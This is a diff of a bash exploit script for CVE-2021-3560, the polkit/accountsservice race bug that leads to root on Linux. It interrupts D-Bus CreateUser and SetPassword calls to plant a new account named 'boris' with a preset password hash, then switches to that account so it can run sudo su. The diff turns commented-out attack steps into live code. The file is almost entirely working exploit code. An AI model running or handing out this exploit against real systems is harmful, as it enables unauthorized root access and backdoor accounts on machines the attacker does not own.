@@ -1,43 +1,59 @@
 #!/bin/bash
 
+# Exploit Title: CVE-2021-3560 PrivEsc2root Exploit
+# Google Dork: [n/a]
+# Date: [11th June 2021]
+# DISCOVERED BY: Kevin Backhouse
+# Source: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
+# Exploit Author: Swapravo Sinha Roy
+# Software Link: https://github.com/swapravo/polkadots
+# Tested on: Fedora 21
+# CVE-2021-3560
+# Affected Distributions: RHEL 8, Fedora 21, Debian testing (Bullseye), Ubuntu 20.04
+
+# sorry for the untidy code
+# did this in a hurry
+
+
+# change this to apt-get, if on debian 
 exists1=$(yum list installed | grep accountsservice)
 exists2=$(yum list installed | grep gnome-control-center)
 if [ "$exists1" = "" ] || [ "$exists2" = "" ]; then
-	echo  "Required services not installed!"
-else
-	echo "step2"
+	echo "Required services not installed!"
+	echo "Likely to Fail!"
 fi
 
-function setval { printf -v "$1" "%s" "$(cat)"; declare -p "$1"; }
+setval() {
+	printf -v "$1" "%s" "$(cat)"; declare -p "$1";
+}
 
 timeit(){
 	time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
 }
 
-catch()
-{
-eval "$({
-__2="$(
-  { __1="$("${@:3}")"; } 2>&1;
-  ret=$?;
-  printf '%q=%q\n' "$1" "$__1" >&2;
-  exit $ret
-  )";
-ret="$?";
-printf '%s=%q\n' "$2" "$__2" >&2;
-printf '( exit %q )' "$ret" >&2;
-} 2>&1 )";
+catch(){
+	eval "$({
+	__2="$(
+	  { __1="$("${@:3}")"; } 2>&1;
+	  ret=$?;
+	  printf '%q=%q\n' "$1" "$__1" >&2;
+	  exit $ret
+	  )";
+	ret="$?";
+	printf '%s=%q\n' "$2" "$__2" >&2;
+	printf '( exit %q )' "$ret" >&2;
+	} 2>&1 )";
 }
 
 
-
-iters=10
+iters=20
 tt=0.0
-# $(openssl passwd -5 iaminvincible!)
-password=iaminvincible!
-hashed_password='5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB'
 
-echo $hashed_password
+# set you own password here
+# $(openssl passwd -6 iaminvincible!)
+password=iaminvincible!
+hashed_password='$6$cGKhfu9znRnOQV1h$2j/3WKyqTcCaftP1PGhW8Pghj2qV5j8zwy1gHrt9eILUE6WKeWVCTa9QgkskIfwVXpjVI.TuX2D.rEkbwKubi/'
+
 
 for i in $(seq 1 $iters)
 do
@@ -63,9 +79,11 @@ do
 	fi
 done
 
-echo Boris found! $find_boris
+echo Boris found! uid: $find_boris
 
-#dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$find_boris org.freedesktop.Accounts.User.SetPassword string:"$hashed_password" string:GoldenEye & sleep $kill_time ; kill $!
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$find_boris org.freedesktop.Accounts.User.SetPassword string:"$hashed_password" string:GoldenEye & sleep $kill_time ; kill $!
 
-#su - boris
-sudo su
+su - boris
+
+# in boris@victim, execute:
+# sudo su
